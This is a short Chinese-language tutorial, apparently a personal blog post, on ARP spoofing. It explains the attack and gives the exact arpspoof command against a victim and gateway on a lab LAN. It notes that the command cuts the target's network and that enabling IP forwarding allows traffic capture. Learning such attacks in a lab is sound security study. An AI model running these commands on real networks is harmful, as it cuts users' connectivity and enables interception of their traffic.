ARP欺骗(攻击)

​ APR欺骗或ARP攻击是针对以太网地址解析协议（ARP）的一种攻击技术，通过欺骗局域网内访问者PC的网关MAC地址，使访问者PC错以为攻击者更改后的MAC地址是网关的MAC，导致网络不通。此种攻击可让攻击者获取局域网上的数据包甚至可篡改数据包，且可让局域网特定计算机或所有计算机无法正常连线。

需要工具

  • kali linux
  • arpspoof

操作步骤

探测局域网内主机可使用fping，nmap等工具，这里不做演示

攻击者：kali IP:192.168.2.192

被攻击者：Win7 IP:192.168.2.134

kali攻击命令

arpspoof -i eth0 -t 192.168.2.134 192.168.2.1

arpspoof命令： arpspoof [-i interface] [-t target] host

-i 表示interface填网卡名

-t 表示target填目标IP

host 填网关地址

出现图片所示情况，则说明攻击成功，如果一直攻击的话，目标将持续断网

然后按 ctrl+c 可以停止攻击，此时目标主机恢复网络

后续开启路由转发还能抓取流量

这也是我刚接触网络安全时学习的第一个算是攻击方法吧
